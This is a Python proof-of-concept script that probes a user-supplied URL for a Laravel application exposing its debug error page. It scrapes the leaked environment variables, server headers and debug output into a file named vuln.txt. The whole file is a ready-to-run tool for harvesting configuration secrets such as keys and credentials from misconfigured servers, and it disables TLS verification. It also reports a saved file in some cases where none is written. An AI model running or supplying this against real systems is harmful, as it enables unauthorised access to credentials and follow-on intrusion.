import requests
from bs4 import BeautifulSoup
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def laravel_info(url):
    headers = {
        #Poc
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    #Post
    response = requests.post(url, headers=headers, allow_redirects=False, verify=False)
    
    if response.status_code == 405:
        if b"MethodNotAllowedHttpException" in response.content and b"Environment &amp; details" in response.content:
            if b"vendor\laravel\framework\src\Illuminate\Routing\RouteCollection.php" in response.content or b"vendor/laravel/framework/src/Illuminate/Routing/RouteCollection.php" in response.content:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                environment_details = soup.find_all('div', {"class": "details"})
                
                if environment_details:
                    output = "[+] Vulnerable: Debug Information Leak found at " + url + "\n\n"
                    output += "[+] Environment Details:\n"
                    
                    for detail in environment_details:
                        raw_text = detail.get_text(strip=True)
                        formatted_details = format_info(raw_text)
                        output += formatted_details
                    
                    output += "\n"  
                    output += "[+] Server Information:\n"
                    output += f"Server: {response.headers.get('Server', 'N/A')}\n"
                    output += f"X-Powered-By: {response.headers.get('X-Powered-By', 'N/A')}\n"
                    output += "\n"  

                    debug_info = soup.find_all('pre')
                    if debug_info:
                        output += "[+] Debug Information:\n"
                        for debug in debug_info:
                            output += f"{debug.get_text(strip=True)}\n"
                    
                    with open('vuln.txt', 'w') as vuln_file:
                        vuln_file.write(output)
                
                print("\n[+] Vulnerability information saved to vuln.txt\n")
                return True
    
    print("\n[-] Not vulnerable. No file created.\n")
    return False

def format_info(raw_text):
    formatted = ""
    key_value_pairs = re.findall(r'([A-Z_]+[A-Z0-9_]*)"(.*?)"', raw_text)  
    for key, value in key_value_pairs:
        formatted += f"{key}: {value}\n"
    return formatted

def main():
    target = input("Target : ")
    if laravel_info(target):
        pass
    else:
        pass

if __name__ == "__main__":
    main()